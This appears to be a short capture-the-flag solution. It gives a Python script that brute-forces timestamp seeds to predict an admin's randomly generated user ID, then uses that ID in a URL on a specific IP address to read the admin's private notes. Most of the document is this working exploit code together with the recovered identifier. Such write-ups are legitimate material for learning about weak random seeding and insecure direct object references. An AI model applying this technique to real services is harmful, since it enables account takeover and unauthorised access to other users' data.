##  Process

First crack admin user id using
`python cracker.py`

Now access admin notes using
http://52.163.52.206:5001/my_notes?user_id=7bdeij4oiafjdypqyrl2znwk7w9lulgn

### cracker.py

```python
import string, random, time
from datetime import datetime, timezone


# Admin
post_admin = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'
alphabet = list(string.ascii_lowercase + string.digits)


def get_random_id():
    return ''.join([random.choice(alphabet) for _ in range(32)])


def crack():
	timestamp = 1610677740
	while True:
		timestamp = round(timestamp, 4)
		post_at = datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
		random.seed(timestamp)
		user_id = get_random_id()	
		random.seed(user_id + post_at)
		note_id = get_random_id()
		if note_id == post_admin:
			print("Admin Found", user_id)
		timestamp += 0.0001

print("Cracking...")
crack()
```

